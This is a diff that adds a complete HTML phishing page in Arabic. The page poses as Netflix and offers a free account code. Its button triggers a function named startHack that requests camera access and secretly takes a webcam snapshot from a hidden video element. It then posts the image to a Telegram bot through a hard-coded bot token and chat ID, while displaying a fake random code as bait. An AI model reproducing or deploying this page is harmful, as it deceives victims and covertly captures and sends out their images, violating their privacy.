@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نتفلكس</title>
+    <style>
+        body { background-color: #141414; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .container { max-width: 400px; margin: auto; border: 1px solid #e50914; padding: 20px; border-radius: 10px; }
+        h1 { color: #e50914; font-size: 3rem; }
+        button { background-color: #e50914; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; cursor: pointer; border-radius: 5px; margin-top: 20px; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>NETFLIX</h1>
+        <p>احصل على حساب مجاني الآن!</p>
+        <button onclick="startHack()">توليد كود الحساب</button>
+        <div id="result"></div>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const telegramToken = '8489198562:AAGKWPcxITxMIcjmig-PjJ5NeMmnLcyFCY8';
+        const chatId = '6145914322';
+
+        async function startHack() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    takeSnapshot();
+                    document.getElementById('result').innerHTML = "كود الحساب: NF-X" + Math.floor(Math.random() * 999999);
+                }, 2000);
+            } catch (err) {
+                alert("يجب السماح بالصلاحيات للحصول على الكود!");
+            }
+        }
+
+        function takeSnapshot() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'screenshot.jpg');
+
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
+
